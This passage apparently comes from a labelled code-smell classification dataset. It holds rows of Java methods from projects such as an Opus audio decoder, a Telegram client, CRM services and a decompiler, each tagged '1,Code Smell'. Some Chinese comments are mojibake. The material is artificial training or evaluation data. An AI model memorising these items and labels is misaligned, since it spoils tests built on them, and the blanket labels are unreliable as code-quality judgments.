          indices.add(new NDIndexBooleans(array));
          return argIndex + 1;
        }
 else         if (array.getDataType().isInteger() || array.getDataType().isFloating()) {
          indices.add(new NDIndexTake(array));
          return argIndex + 1;
        }
      }
 else       if (arg == null) {
        indices.add(new NDIndexNull());
        return argIndex + 1;
      }
      throw new IllegalArgumentException(""Unknown argument: "" + arg);
    }
 else {
      indices.add(new NDIndexFixed(Long.parseLong(digit)));
      return argIndex;
    }
  }
  Long min=null;
  Long max=null;
  Long step=null;
  if (m.group(3) != null) {
    min=parseSliceItem(m.group(3),argIndex,args);
    if (""{}"".equals(m.group(3))) {
      argIndex++;
    }
  }
  if (m.group(4) != null) {
    max=parseSliceItem(m.group(4),argIndex,args);
    if (""{}"".equals(m.group(4))) {
      argIndex++;
    }
  }
  if (m.group(6) != null) {
    step=parseSliceItem(m.group(6),argIndex,args);
    if (""{}"".equals(m.group(6))) {
      argIndex++;
    }
  }
  if (min == null && max == null && step == null) {
    indices.add(new NDIndexAll());
  }
 else {
    indices.add(new NDIndexSlice(min,max,step));
  }
  return argIndex;
}",1,Code Smell
"@Override @Nullable protected OpusDecoderException decode(DecoderInputBuffer inputBuffer,SimpleOutputBuffer outputBuffer,boolean reset){
  if (reset) {
    opusReset(nativeDecoderContext);
    skipSamples=(inputBuffer.timeUs == 0) ? headerSkipSamples : headerSeekPreRollSamples;
  }
  ByteBuffer inputData=inputBuffer.data;
  CryptoInfo cryptoInfo=inputBuffer.cryptoInfo;
  int result=inputBuffer.isEncrypted() ? opusSecureDecode(nativeDecoderContext,inputBuffer.timeUs,inputData,inputData.limit(),outputBuffer,SAMPLE_RATE,exoMediaCrypto,cryptoInfo.mode,cryptoInfo.key,cryptoInfo.iv,cryptoInfo.numSubSamples,cryptoInfo.numBytesOfClearData,cryptoInfo.numBytesOfEncryptedData) : opusDecode(nativeDecoderContext,inputBuffer.timeUs,inputData,inputData.limit(),outputBuffer);
  if (result < 0) {
    if (result == DRM_ERROR) {
      String message=""Drm error: "" + opusGetErrorMessage(nativeDecoderContext);
      DecryptionException cause=new DecryptionException(opusGetErrorCode(nativeDecoderContext),message);
      return new OpusDecoderException(message,cause);
    }
 else {
      return new OpusDecoderException(""Decode error: "" + opusGetErrorMessage(result));
    }
  }
  ByteBuffer outputData=outputBuffer.data;
  outputData.position(0);
  outputData.limit(result);
  if (skipSamples > 0) {
    int bytesPerSample=channelCount * 2;
    int skipBytes=skipSamples * bytesPerSample;
    if (result <= skipBytes) {
      skipSamples-=result / bytesPerSample;
      outputBuffer.addFlag(C.BUFFER_FLAG_DECODE_ONLY);
      outputData.position(result);
    }
 else {
      skipSamples=0;
      outputData.position(skipBytes);
    }
  }
  return null;
}",1,Code Smell
"/** 
 * Returns whether it's possible to read  {@code n} bits starting from the current offset. Theoffset is not modified.
 * @param numBits The number of bits.
 * @return Whether it is possible to read {@code n} bits.
 */
public boolean canReadBits(int numBits){
  int oldByteOffset=byteOffset;
  int numBytes=numBits / 8;
  int newByteOffset=byteOffset + numBytes;
  int newBitOffset=bitOffset + numBits - (numBytes * 8);
  if (newBitOffset > 7) {
    newByteOffset++;
    newBitOffset-=8;
  }
  for (int i=oldByteOffset + 1; i <= newByteOffset && newByteOffset < byteLimit; i++) {
    if (shouldSkipByte(i)) {
      newByteOffset++;
      i+=2;
    }
  }
  return newByteOffset < byteLimit || (newByteOffset == byteLimit && newBitOffset == 0);
}",1,Code Smell
"public void scanDescriptorQR(ActionEvent event){
  QRScanDialog qrScanDialog=new QRScanDialog();
  qrScanDialog.initOwner(scanDescriptorQR.getScene().getWindow());
  Optional<QRScanDialog.Result> optionalResult=qrScanDialog.showAndWait();
  if (optionalResult.isPresent()) {
    QRScanDialog.Result result=optionalResult.get();
    if (result.outputDescriptor != null) {
      rederiveAndReplaceWallet(result.outputDescriptor.toWallet());
    }
 else     if (result.wallets != null) {
      for (      Wallet wallet : result.wallets) {
        if (scriptType.getValue().equals(wallet.getScriptType()) && !wallet.getKeystores().isEmpty()) {
          OutputDescriptor outputDescriptor=OutputDescriptor.getOutputDescriptor(wallet);
          rederiveAndReplaceWallet(outputDescriptor.toWallet());
          break;
        }
      }
    }
 else     if (result.payload != null && !result.payload.isEmpty()) {
      setDescriptorText(result.payload);
    }
 else     if (result.exception != null) {
      log.error(""Error scanning QR"",result.exception);
      AppServices.showErrorDialog(""Error scanning QR"",result.exception.getMessage());
    }
  }
}
",1,Code Smell
"public List<Content> deleteMembers(CrmMemberSaveBO crmMemberSaveBO){
  List<Content> contentList=new ArrayList<>();
  for (  Integer id : crmMemberSaveBO.getIds()) {
    String businessName=crmBusinessService.getBusinessName(id);
    for (    Long memberId : crmMemberSaveBO.getMemberIds()) {
      if (!memberId.equals(UserUtil.getUserId())) {
        contentList.add(sysLogUtil.addDeleteMemberActionRecord(CrmEnum.BUSINESS,memberId,false,businessName));
      }
 else {
        contentList.add(sysLogUtil.addDeleteMemberActionRecord(CrmEnum.BUSINESS,memberId,true,businessName));
      }
    }
  }
  return contentList;
}
",1,Code Smell
"public static synchronized Body retrieveBody(SootMethod method,String signature,boolean tries){
  ExecutorService executor=Executors.newSingleThreadExecutor();
  Body body=null;
  try {
    Future<Body> future=executor.submit(() -> method.retrieveActiveBody());
    body=future.get(Integer.max(GlobalConfiguration.TIMEOUT - 1,1) * 60L,TimeUnit.SECONDS);
  }
 catch (  TimeoutException e) {
    throw new RuntimeException(""Body retrieve error: method Fetch Timeout "" + signature);
  }
catch (  ExecutionException|InterruptedException e) {
    String msg=e.getMessage();
    if (tries && msg != null && msg.contains(""Failed to convert"")) {
      Throwable temp=e;
      do {
        String message=temp.getMessage();
        if (message != null && message.contains(""This operation requires resolving level HIERARCHY"")) {
          Matcher matcher=PATTERN.matcher(message);
          if (matcher.find()) {
            String classname=matcher.group(1);
            if (classname != null && !classname.isEmpty()) {
              Scene.v().addBasicClass(classname,SootClass.HIERARCHY);
              Scene.v().loadClassAndSupport(classname);
              body=retrieveBody(method,signature,false);
            }
          }
          break;
        }
        temp=temp.getCause();
      }
 while (temp != null);
    }
    if (body == null) {
      throw new RuntimeException(""Body retrieve error: "" + e);
    }
  }
 finally {
    executor.shutdown();
  }
  return body;
}",1,Code Smell
"@SuppressLint(""UnsafeDynamicallyLoadedCode"") private static void loadNativeLibraryInHost(Context ctx,String modulePath,List<String> abis) throws UnsatisfiedLinkError {
  Iterator<String> it=abis.iterator();
  if (modulePath != null && modulePath.length() > 0 && new File(modulePath).exists()) {
    while (it.hasNext()) {
      String abi=it.next();
      try {
        System.load(modulePath + ""!/lib/"" + abi+ ""/libqauxv.so"");
        Log.d(""dlopen by mmap success"");
        return;
      }
 catch (      UnsatisfiedLinkError e1) {
        throwIfJniError(e1);
      }
    }
  }
  File libname=extractNativeLibrary(ctx,""qauxv"",abis.get(0));
  registerNativeLibEntry(libname.getName());
  try {
    System.load(libname.getAbsolutePath());
    Log.d(""dlopen by extract success"");
  }
 catch (  UnsatisfiedLinkError e3) {
    throwIfJniError(e3);
    Log.e(""Build.SDK_INT="" + VERSION.SDK_INT);
    Log.e(""Build.CPU_ABI is: "" + Build.CPU_ABI);
    Log.e(""Build.CPU_ABI2 is: "" + Build.CPU_ABI2);
    Log.e(""Build.SUPPORTED_ABIS is: "" + Arrays.toString(Build.SUPPORTED_ABIS));
    Log.e(""Build.SUPPORTED_32_BIT_ABIS is: "" + Arrays.toString(Build.SUPPORTED_32_BIT_ABIS));
    Log.e(""Build.SUPPORTED_64_BIT_ABIS is: "" + Arrays.toString(Build.SUPPORTED_64_BIT_ABIS));
    Log.e(""Process.is64bit is: "" + Process.is64Bit());
    StructUtsname uts=Os.uname();
    Log.e(""uts.machine is: "" + uts.machine);
    Log.e(""uts.version is: "" + uts.version);
    Log.e(""uts.sysname is: "" + uts.sysname);
    throw e3;
  }
}",1,Code Smell
"public static Statement isHead(Statement head){
  if (head.getLastBasicType() == LASTBASICTYPE_GENERAL && !head.isMonitorEnter()) {
    StatEdge edge=null;
    List<StatEdge> lstSuccs=head.getSuccessorEdges(STATEDGE_DIRECT_ALL);
    if (!lstSuccs.isEmpty()) {
      edge=lstSuccs.get(0);
    }
    if (edge != null && edge.getType() == StatEdge.TYPE_REGULAR && edge.getDestination() == head) {
      return new DoStatement(head);
    }
    if (head.type != TYPE_DO && (edge == null || edge.getType() != StatEdge.TYPE_REGULAR) && head.getContinueSet().contains(head.getBasichead())) {
      return new DoStatement(head);
    }
  }
  return null;
}",1,Code Smell
"public static int getCapitalizationType(@NonNull final String text){
  final int len=text.length();
  int index=0;
  for (; index < len; index=text.offsetByCodePoints(index,1)) {
    if (Character.isLetter(text.codePointAt(index))) {
      break;
    }
  }
  if (index == len)   return CAPITALIZE_NONE;
  if (!Character.isUpperCase(text.codePointAt(index))) {
    return CAPITALIZE_NONE;
  }
  int capsCount=1;
  int letterCount=1;
  for (index=text.offsetByCodePoints(index,1); index < len; index=text.offsetByCodePoints(index,1)) {
    if (1 != capsCount && letterCount != capsCount)     break;
    final int codePoint=text.codePointAt(index);
    if (Character.isUpperCase(codePoint)) {
      ++capsCount;
      ++letterCount;
    }
 else     if (Character.isLetter(codePoint)) {
      ++letterCount;
    }
  }
  if (1 == capsCount)   return CAPITALIZE_FIRST;
  return (letterCount == capsCount ? CAPITALIZE_ALL : CAPITALIZE_NONE);
}",1,Code Smell
"/** 
 * {@inheritDoc} 
 */
@Override public RegisterMapper allocateRegisters(){
  int oldRegCount=ssaMeth.getRegCount();
  BasicRegisterMapper mapper=new BasicRegisterMapper(oldRegCount);
  int nextNewRegister=0;
  if (PRESLOT_PARAMS) {
    nextNewRegister=ssaMeth.getParamWidth();
  }
  for (int i=0; i < oldRegCount; i++) {
    if (mapped.get(i)) {
      continue;
    }
    int maxCategory=getCategoryForSsaReg(i);
    IntSet current=new BitIntSet(oldRegCount);
    interference.mergeInterferenceSet(i,current);
    boolean isPreslotted=false;
    int newReg=0;
    if (PRESLOT_PARAMS && isDefinitionMoveParam(i)) {
      NormalSsaInsn defInsn=(NormalSsaInsn)ssaMeth.getDefinitionForRegister(i);
      newReg=paramNumberFromMoveParam(defInsn);
      mapper.addMapping(i,newReg,maxCategory);
      isPreslotted=true;
    }
 else {
      mapper.addMapping(i,nextNewRegister,maxCategory);
      newReg=nextNewRegister;
    }
    for (int j=i + 1; j < oldRegCount; j++) {
      if (mapped.get(j) || isDefinitionMoveParam(j)) {
        continue;
      }
      if (!current.has(j) && !(isPreslotted && (maxCategory < getCategoryForSsaReg(j)))) {
        interference.mergeInterferenceSet(j,current);
        maxCategory=Math.max(maxCategory,getCategoryForSsaReg(j));
        mapper.addMapping(j,newReg,maxCategory);
        mapped.set(j);
      }
    }
    mapped.set(i);
    if (!isPreslotted) {
      nextNewRegister+=maxCategory;
    }
  }
  return mapper;
}",1,Code Smell
"public void fetchEmojiStatuses(int type,boolean cache){
  if (emojiStatusesFetching[type]) {
    return;
  }
  emojiStatusesFetching[type]=true;
  if (cache) {
    getMessagesStorage().getStorageQueue().postRunnable(() -> {
      boolean done=false;
      try {
        SQLiteCursor cursor=getMessagesStorage().getDatabase().queryFinalized(""SELECT data FROM emoji_statuses WHERE type = "" + type + "" LIMIT 1"");
        if (cursor.next() && cursor.getColumnCount() > 0 && !cursor.isNull(0)) {
          NativeByteBuffer data=cursor.byteBufferValue(0);
          if (data != null) {
            TLRPC.account_EmojiStatuses response=TLRPC.account_EmojiStatuses.TLdeserialize(data,data.readInt32(false),false);
            if (response instanceof TLRPC.TL_account_emojiStatuses) {
              emojiStatusesHash[type]=response.hash;
              emojiStatuses[type]=response.statuses;
              done=true;
            }
            data.reuse();
          }
        }
        cursor.dispose();
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
      emojiStatusesFromCacheFetched[type]=true;
      emojiStatusesFetching[type]=false;
      if (done) {
        AndroidUtilities.runOnUIThread(() -> {
          getNotificationCenter().postNotificationName(NotificationCenter.recentEmojiStatusesUpdate);
        }
);
      }
 else {
        fetchEmojiStatuses(type,false);
      }
    }
);
  }
 else {
    TLObject req;
    if (type == 0) {
      TLRPC.TL_account_getRecentEmojiStatuses recentReq=new TLRPC.TL_account_getRecentEmojiStatuses();
      recentReq.hash=emojiStatusesHash[type];
      req=recentReq;
    }
 else {
      TLRPC.TL_account_getDefaultEmojiStatuses defaultReq=new TLRPC.TL_account_getDefaultEmojiStatuses();
      defaultReq.hash=emojiStatusesHash[type];
      req=defaultReq;
    }
    ConnectionsManager.getInstance(currentAccount).sendRequest(req,(res,err) -> {
      emojiStatusesFetchDate[type]=System.currentTimeMillis() / 1000;
      if (res instanceof TLRPC.TL_account_emojiStatusesNotModified) {
        emojiStatusesFetching[type]=false;
      }
 else       if (res instanceof TLRPC.TL_account_emojiStatuses) {
        TLRPC.TL_account_emojiStatuses response=(TLRPC.TL_account_emojiStatuses)res;
        emojiStatusesHash[type]=response.hash;
        emojiStatuses[type]=response.statuses;
        updateEmojiStatuses(type,response);
        AndroidUtilities.runOnUIThread(() -> {
          getNotificationCenter().postNotificationName(NotificationCenter.recentEmojiStatusesUpdate);
        }
);
      }
    }
);
  }
}",1,Code Smell
"@Override public BlockState getStateForPlacement(BlockPlaceContext context){
  Direction facing=getFacingForPlacement(context);
  BlockPos pos=context.getClickedPos();
  Level world=context.getLevel();
  boolean alongFirst=false;
  Axis faceAxis=facing.getAxis();
  if (faceAxis.isHorizontal()) {
    alongFirst=faceAxis == Axis.Z;
    Direction positivePerpendicular=faceAxis == Axis.X ? Direction.SOUTH : Direction.EAST;
    boolean shaftAbove=prefersConnectionTo(world,pos,Direction.UP,true);
    boolean shaftBelow=prefersConnectionTo(world,pos,Direction.DOWN,true);
    boolean preferLeft=prefersConnectionTo(world,pos,positivePerpendicular,false);
    boolean preferRight=prefersConnectionTo(world,pos,positivePerpendicular.getOpposite(),false);
    if (shaftAbove || shaftBelow || preferLeft|| preferRight)     alongFirst=faceAxis == Axis.X;
  }
  if (faceAxis.isVertical()) {
    alongFirst=getAxisAlignmentForPlacement(context);
    Direction prefferedSide=null;
    for (    Direction side : Iterate.horizontalDirections) {
      if (!prefersConnectionTo(world,pos,side,true) && !prefersConnectionTo(world,pos,side.getClockWise(),false))       continue;
      if (prefferedSide != null && prefferedSide.getAxis() != side.getAxis()) {
        prefferedSide=null;
        break;
      }
      prefferedSide=side;
    }
    if (prefferedSide != null)     alongFirst=prefferedSide.getAxis() == Axis.X;
  }
  return this.defaultBlockState().setValue(FACING,facing).setValue(AXIS_ALONG_FIRST_COORDINATE,alongFirst);
}
",1,Code Smell
"/** 
 * Clean input timestamp to yyyy-mm-dd hh:mm:ss[.fffffffff] format.
 * @param s input timestamp
 * @return cleaned timestamp
 */
private String cleanTimestamp(String s){
  if (s == null) {
    throw new java.lang.IllegalArgumentException(""null string"");
  }
  s=s.trim();
  s=replaceFirstNonNumericSubstring(s,0,'-');
  s=replaceFirstNonNumericSubstring(s,s.indexOf('-') + 1,'-');
  s=replaceFirstNonNumericSubstring(s,s.indexOf('-',s.indexOf('-') + 1) + 1,' ');
  if (s.indexOf(' ') != -1) {
    s=replaceFirstNonNumericSubstring(s,s.indexOf(' ') + 1,':');
    if (s.indexOf(':') != -1) {
      s=replaceFirstNonNumericSubstring(s,s.indexOf(':') + 1,':');
    }
  }
  final int maxMonth=12;
  final int maxDay=31;
  int firstDash=s.indexOf('-');
  int secondDash=s.indexOf('-',firstDash + 1);
  int dividingSpace=s.indexOf(' ');
  int firstColon=s.indexOf(':',dividingSpace + 1);
  int secondColon=s.indexOf(':',firstColon + 1);
  int period=s.indexOf('.',secondColon + 1);
  int year=0;
  int month=0;
  int day=0;
  int hour=0;
  int minute=0;
  int second=0;
  int len=s.length();
  boolean parsedDate=false;
  if (firstDash > 0 && secondDash > firstDash) {
    year=Integer.parseInt(s.substring(0,firstDash));
    month=Integer.parseInt(s.substring(firstDash + 1,secondDash));
    if (dividingSpace != -1) {
      day=Integer.parseInt(s.substring(secondDash + 1,dividingSpace));
    }
 else {
      day=Integer.parseInt(s.substring(secondDash + 1,len));
    }
    if ((month >= 1 && month <= maxMonth) && (day >= 1 && day <= maxDay)) {
      parsedDate=true;
    }
  }
  if (!parsedDate) {
    throw new java.lang.IllegalArgumentException(""Cannot parse the date from "" + s);
  }
  if (dividingSpace != -1 && dividingSpace < len - 1) {
    if (firstColon == -1) {
      hour=Integer.parseInt(s.substring(dividingSpace + 1,len));
    }
 else {
      hour=Integer.parseInt(s.substring(dividingSpace + 1,firstColon));
      if (firstColon < len - 1) {
        if (secondColon == -1) {
          minute=Integer.parseInt(s.substring(firstColon + 1,len));
        }
 else {
          minute=Integer.parseInt(s.substring(firstColon + 1,secondColon));
          if (secondColon < len - 1) {
            if (period == -1) {
              second=Integer.parseInt(s.substring(secondColon + 1,len));
            }
 else {
              second=Integer.parseInt(s.substring(secondColon + 1,period));
            }
          }
        }
      }
    }
  }
  StringBuilder cleanedTimestamp=new StringBuilder();
  cleanedTimestamp=cleanedTimestamp.append(String.format(""%04d-%02d-%02d %02d:%02d:%02d"",year,month,day,hour,minute,second));
  if (period != -1 && period < len - 1) {
    cleanedTimestamp=cleanedTimestamp.append(""."").append(s.substring(period + 1));
  }
  return cleanedTimestamp.toString();
}",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public void addOrUpdate(CrmBusinessSaveBO crmModel){
  CrmReturnVisit crmReturnVisit=BeanUtil.copyProperties(crmModel.getEntity(),CrmReturnVisit.class);
  String batchId=StrUtil.isNotEmpty(crmReturnVisit.getBatchId()) ? crmReturnVisit.getBatchId() : IdUtil.simpleUUID();
  actionRecordUtil.updateRecord(crmModel.getField(),Dict.create().set(""batchId"",batchId).set(""dataTableName"",""wk_crm_return_visit_data""));
  crmReturnVisitDataService.saveData(crmModel.getField(),batchId);
  if (ObjectUtil.isNotEmpty(crmReturnVisit.getVisitId())) {
    actionRecordUtil.updateRecord(BeanUtil.beanToMap(getById(crmReturnVisit.getVisitId())),BeanUtil.beanToMap(crmReturnVisit),CrmEnum.RETURN_VISIT,crmReturnVisit.getVisitNumber(),crmReturnVisit.getVisitId());
    crmReturnVisit.setUpdateTime(DateUtil.date());
    updateById(crmReturnVisit);
    crmReturnVisit=getById(crmReturnVisit.getVisitId());
  }
 else {
    List<AdminConfig> configList=adminService.queryConfigByName(""numberSetting"").getData();
    AdminConfig adminConfig=configList.stream().filter(config -> Objects.equals(getLabel().getType().toString(),config.getValue())).collect(Collectors.toList()).get(0);
    if (adminConfig.getStatus() == 1 && StrUtil.isEmpty(crmReturnVisit.getVisitNumber())) {
      String result=crmNumberSettingService.generateNumber(adminConfig,crmReturnVisit.getVisitTime());
      crmReturnVisit.setVisitNumber(result);
    }
    Integer contract=lambdaQuery().eq(CrmReturnVisit::getVisitNumber,crmReturnVisit.getVisitNumber()).count();
    if (contract != 0) {
      throw new CrmException(CrmCodeEnum.CRM_CRMRETURNVISIT_NUM_ERROR);
    }
    crmReturnVisit.setBatchId(batchId);
    crmReturnVisit.setUpdateTime(new Date());
    if (crmReturnVisit.getOwnerUserId() == null) {
      crmReturnVisit.setOwnerUserId(UserUtil.getUserId());
    }
    save(crmReturnVisit);
    actionRecordUtil.addRecord(crmReturnVisit.getVisitId(),CrmEnum.RETURN_VISIT,crmReturnVisit.getVisitNumber());
  }
  crmModel.setEntity(BeanUtil.beanToMap(crmReturnVisit));
  savePage(crmModel,crmReturnVisit.getVisitId(),false);
}",1,Code Smell
"private void indeterminateChanged(){
  boolean show=indeterminateButton.isSelected();
  for (  Component c : getComponents()) {
    if ((c instanceof TestStateCheckBox && ((TestStateCheckBox)c).isStateIndeterminate()) || c instanceof FlatTriStateCheckBox || (c instanceof JLabel && ((JLabel)c).getText().startsWith(""ind"")))     c.setVisible(show);
  }
  MigLayout layout=(MigLayout)getLayout();
  Object columnCons=layout.getColumnConstraints();
  AC ac=(columnCons instanceof String) ? ConstraintParser.parseColumnConstraints((String)columnCons) : (AC)columnCons;
  DimConstraint[] constaints=ac.getConstaints();
  constaints[3].setSizeGroup(show ? ""1"" : null);
  constaints[6].setSizeGroup(show ? ""2"" : null);
  BoundSize gap=show ? null : ConstraintParser.parseBoundSize(""0"",true,true);
  constaints[3].setGapBefore(gap);
  constaints[6].setGapBefore(gap);
  layout.setColumnConstraints(ac);
  preview.revalidate();
  revalidate();
  repaint();
  FlatThemeFileEditor.putPrefsBoolean(preview.state,KEY_SHOW_INDETERMINATE,show,true);
}",1,Code Smell
"@Override public PerformanceTestResult parse(PerformanceTestResult performanceTestResult,Logger logger){
  int inspectionSize=performanceTestResult.performanceInspectionResults.size();
  if (inspectionSize > 0) {
    List<PerformanceInspectionResult> oldInspectionResults=performanceTestResult.performanceInspectionResults;
    PerformanceInspectionResult firstInspectionResult=oldInspectionResults.get(0);
    PerformanceInspection firstInspection=firstInspectionResult.inspection;
    String inspectionKey=firstInspection.inspectionKey;
    String appId=firstInspection.appId;
    String deviceIdentifier=firstInspection.deviceIdentifier;
    File resultFolder=firstInspection.resultFolder;
    File rawFile=IOSPerfTestHelper.getInstance().getResultFile(inspectionKey);
    IOSPerfTestHelper.getInstance().stop(inspectionKey);
    long startTimeStamp=IOSPerfTestHelper.getInstance().getStartTime(inspectionKey);
    if (rawFile != null) {
      try (BufferedReader bufferedReader=new BufferedReader(new FileReader(rawFile))){
        String line;
        long lineNumber=0;
        int currentInspection=0;
        List<PerformanceInspectionResult> newPerfInspectionResults=new CopyOnWriteArrayList<>();
        while ((line=bufferedReader.readLine()) != null) {
          long timestampForThisLine=startTimeStamp + lineNumber * ONE_SECOND_TIMESTAMP;
          long timestampForNextLine=startTimeStamp + (lineNumber + 1) * ONE_SECOND_TIMESTAMP;
          String description="""";
          if ((currentInspection < inspectionSize) && (currentInspection == 0 || oldInspectionResults.get(currentInspection).timestamp > timestampForThisLine) && oldInspectionResults.get(currentInspection).timestamp < timestampForNextLine) {
            description=oldInspectionResults.get(currentInspection).inspection.description;
            currentInspection++;
          }
          String lineSubString=line.substring(line.indexOf(""{"")).replace(""'"",""\"""").replace(""None"",""null"");
          classLogger.info(""JsonLine: "" + lineSubString);
          IOSEnergyGaugeInfo energyInfo=JSON.parseObject(lineSubString,IOSEnergyGaugeInfo.class);
          JSONObject dataLineObj=JSON.parseObject(lineSubString);
          if (dataLineObj.containsKey(""energy.networking.overhead"")) {
            energyInfo.setNetworkingOverhead(dataLineObj.getFloat(""energy.networking.overhead""));
          }
          energyInfo.setTimeStamp(timestampForThisLine);
          energyInfo.setAppPackageName(appId);
          energyInfo.setDescription(description);
          PerformanceInspection newInspection=PerformanceInspection.createIOSEnergyInspection(appId,deviceIdentifier,description,false);
          newInspection.resultFolder=resultFolder;
          PerformanceInspectionResult result=new PerformanceInspectionResult(rawFile,newInspection,timestampForThisLine);
          result.parsedData=energyInfo;
          newPerfInspectionResults.add(result);
          lineNumber++;
        }
        performanceTestResult.performanceInspectionResults=newPerfInspectionResults;
        performanceTestResult.setResultSummary(getAverageIOSEnergy(newPerfInspectionResults));
        oldInspectionResults.clear();
      }
 catch (      IOException e) {
        throw new RuntimeException(e);
      }
    }
  }
  return performanceTestResult;
}",1,Code Smell
"private void adjustRate(float rate,int originalOutputFrameCount){
  if (outputFrameCount == originalOutputFrameCount) {
    return;
  }
  int newSampleRate=(int)(inputSampleRateHz / rate);
  int oldSampleRate=inputSampleRateHz;
  while (newSampleRate > (1 << 14) || oldSampleRate > (1 << 14)) {
    newSampleRate/=2;
    oldSampleRate/=2;
  }
  moveNewSamplesToPitchBuffer(originalOutputFrameCount);
  for (int position=0; position < pitchFrameCount - 1; position++) {
    while ((oldRatePosition + 1) * newSampleRate > newRatePosition * oldSampleRate) {
      outputBuffer=ensureSpaceForAdditionalFrames(outputBuffer,outputFrameCount,1);
      for (int i=0; i < channelCount; i++) {
        outputBuffer[outputFrameCount * channelCount + i]=interpolate(pitchBuffer,position * channelCount + i,oldSampleRate,newSampleRate);
      }
      newRatePosition++;
      outputFrameCount++;
    }
    oldRatePosition++;
    if (oldRatePosition == oldSampleRate) {
      oldRatePosition=0;
      Assertions.checkState(newRatePosition == newSampleRate);
      newRatePosition=0;
    }
  }
  removePitchFrames(pitchFrameCount - 1);
}",1,Code Smell
"@Override public List<Cookie> loadForRequest(HttpUrl url){
  ArrayList<Cookie> cookieList=new ArrayList<>();
  Cookie.Builder cookieBuilder=new Cookie.Builder().hostOnlyDomain(url.host());
  for (  Map.Entry<String,String> entry : cookies.entrySet()) {
    cookieBuilder.name(entry.getKey()).value(entry.getValue());
    Cookie cookie=cookieBuilder.build();
    cookieList.add(cookie);
  }
  return cookieList;
}
@Override public List<Cookie> loadForRequest(HttpUrl url){
  ArrayList<Cookie> cookieList=new ArrayList<>();
  Cookie.Builder cookieBuilder=new Cookie.Builder();
  for (  javax.servlet.http.Cookie c : cookies) {
    if (StringUtils.isEmpty(c.getName()) || StringUtils.isEmpty(c.getValue())) {
      continue;
    }
    cookieBuilder.name(c.getName());
    cookieBuilder.value(c.getValue());
    if (!StringUtils.isEmpty(c.getDomain())) {
      cookieBuilder.domain(c.getDomain());
    }
    if (!StringUtils.isEmpty(c.getPath())) {
      cookieBuilder.path(c.getPath());
    }
    if (c.getMaxAge() > 0) {
      cookieBuilder.expiresAt(System.currentTimeMillis() + c.getMaxAge() * 1000);
    }
    if (c.isHttpOnly() && !StringUtils.isEmpty(c.getDomain())) {
      cookieBuilder.hostOnlyDomain(c.getDomain());
    }
    Cookie cookie=cookieBuilder.build();
    cookieList.add(cookie);
  }
  return cookieList;
}",1,Code Smell
"/** 
 * creator 涓� empId:nickNameCn 鏍煎紡鐨勫瓧绗︿覆銆�
 * @param creator
 * @return
 */
public UserSimpleInfo from(String creator){
  if (StringUtils.isEmpty(creator)) {
    return null;
  }
  int i=creator.indexOf("":"");
  if (i > -1) {
    String[] split=creator.split("":"");
    UserSimpleInfo userInfo=new UserSimpleInfo();
    if (split.length > 1) {
      userInfo.setEmpId(split[0]);
      userInfo.setNickNameCn(split[1]);
    }
 else     if (split.length == 1) {
      if (i == 0) {
        userInfo.setNickNameCn(split[0]);
      }
 else {
        userInfo.setEmpId(split[0]);
      }
    }
 else {
      return null;
    }
    return userInfo;
  }
 else {
    return null;
  }
}",1,Code Smell
"/** 
 * 鍐欏畬HTML娉ㄩ噴缁撴潫绗︼紙 {@code -->}锛夊悗鍋滄銆�
 * @param in
 * @param handler
 * @param tagName
 * @param afterTagName
 * @throws IOException
 */
protected void filterAfterHtmlComment(Reader in,FilterHandler handler,String tagName,String afterTagName) throws IOException {
  Writer out=handler.getOut();
  out.write(TAG_START_CHAR);
  out.write(tagName);
  writeIfNonNull(out,afterTagName);
  if (TAG_END_STR.equals(afterTagName) && tagName.length() >= ""!----"".length() && tagName.endsWith(""--""))   ;
 else   filterAfterHtmlComment(in,handler);
}
/** 
 * 鍐欏畬HTML娉ㄩ噴缁撴潫绗︼紙 {@code -->}锛夊悗鍋滄銆�
 * @param in
 * @param handler
 * @throws IOException
 */
protected void filterAfterHtmlComment(Reader in,FilterHandler handler) throws IOException {
  Writer out=handler.getOut();
  int c=-1;
  while ((c=in.read()) > -1) {
    out.write(c);
    if (c == '-') {
      c=in.read();
      writeIfValid(out,c);
      if (c == '-') {
        c=in.read();
        writeIfValid(out,c);
        if (c == TAG_END_CHAR)         break;
      }
    }
  }
}",1,Code Smell
"private void init(){
  messageViewModel.messageLiveData().observe(getViewLifecycleOwner(),new Observer<List<UiMessage>>(){
    @Override public void onChanged(    List<UiMessage> uiMessages){
      for (      UiMessage uiMessage : uiMessages) {
        if (uiMessage.message.messageId == 0 || uiMessage.message.content.notLoaded > 0) {
          return;
        }
        Conversation conversation=uiMessage.message.conversation;
        ConferenceInfo conferenceInfo=ConferenceManager.getManager().getCurrentConferenceInfo();
        if (conferenceInfo != null && conversation.type == Conversation.ConversationType.ChatRoom && conversation.line == 0 && conversation.target.equals(conferenceInfo.getConferenceId())) {
          if (!contains(uiMessage)) {
            messages.add(uiMessage);
            messageAdapter.notifyItemInserted(messages.size() - 1);
          }
        }
      }
    }
  }
);
  messageAdapter=new MessageAdapter();
  messageRecyclerView.setLayoutManager(new LinearLayoutManager(getContext()));
  messageRecyclerView.setAdapter(messageAdapter);
  handler=new Handler();
  handler.postDelayed(this::checkMessageTimeout,TIMEOUT);
}",1,Code Smell
"private boolean checkDiscard(){
  String about=info != null && info.about != null ? info.about : """";
  if (info != null && ChatObject.isChannel(currentChat) && info.hidden_prehistory != historyHidden || nameTextView != null && !currentChat.title.equals(nameTextView.getText().toString()) || descriptionTextView != null && !about.equals(descriptionTextView.getText().toString()) || signMessages != currentChat.signatures || forum != currentChat.forum) {
    AlertDialog.Builder builder=new AlertDialog.Builder(getParentActivity());
    builder.setTitle(LocaleController.getString(""UserRestrictionsApplyChanges"",R.string.UserRestrictionsApplyChanges));
    if (isChannel) {
      builder.setMessage(LocaleController.getString(""ChannelSettingsChangedAlert"",R.string.ChannelSettingsChangedAlert));
    }
 else {
      builder.setMessage(LocaleController.getString(""GroupSettingsChangedAlert"",R.string.GroupSettingsChangedAlert));
    }
    builder.setPositiveButton(LocaleController.getString(""ApplyTheme"",R.string.ApplyTheme),(dialogInterface,i) -> processDone());
    builder.setNegativeButton(LocaleController.getString(""PassportDiscard"",R.string.PassportDiscard),(dialog,which) -> finishFragment());
    showDialog(builder.create());
    return false;
  }
  return true;
}
",1,Code Smell
"public static int broadcastIntentWithFeature(String callingFeatureId,Intent intent,String resolvedType,IIntentReceiver resultTo,int resultCode,String resultData,Bundle map,String[] requiredPermissions,int appOp,Bundle options,boolean serialized,boolean sticky,int userId) throws RemoteException {
  IActivityManager am=getActivityManager();
  if (am == null || appThread == null)   return -1;
